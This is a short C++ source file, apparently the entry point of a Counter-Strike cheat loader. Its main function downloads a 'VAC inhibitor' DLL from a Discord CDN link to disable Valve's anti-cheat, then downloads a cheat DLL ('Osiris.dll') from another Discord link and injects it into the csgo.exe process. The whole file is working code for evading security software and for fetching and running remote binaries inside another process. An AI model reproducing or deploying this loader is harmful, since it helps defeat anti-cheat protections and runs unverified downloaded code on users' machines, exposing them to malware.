#include "stdafx.hpp"
#include "vac_inhibitor.hpp"
#include "injector.hpp"
#include <windows.h>

int main()
{
	LPCSTR vac_inhibitor_url = "https://cdn.discordapp.com/attachments/1136059719484719175/1147729662701748224/vac3_inhibitor.dll";
	int vacDisabled = !vac_inhibitor(vac_inhibitor_url);

	if (vacDisabled)
	{
		LPCSTR dllUrl = "https://cdn.discordapp.com/attachments/1136059719484719175/1147720934229295175/Osiris.dll";

		int verifyDllLoaded = !injector(dllUrl, "csgo.exe", 1);

		if(verifyDllLoaded)
		{
			Beep(500, 100);

			ExitProcess(0);
			return 0;
		}
	}

	return 1;
}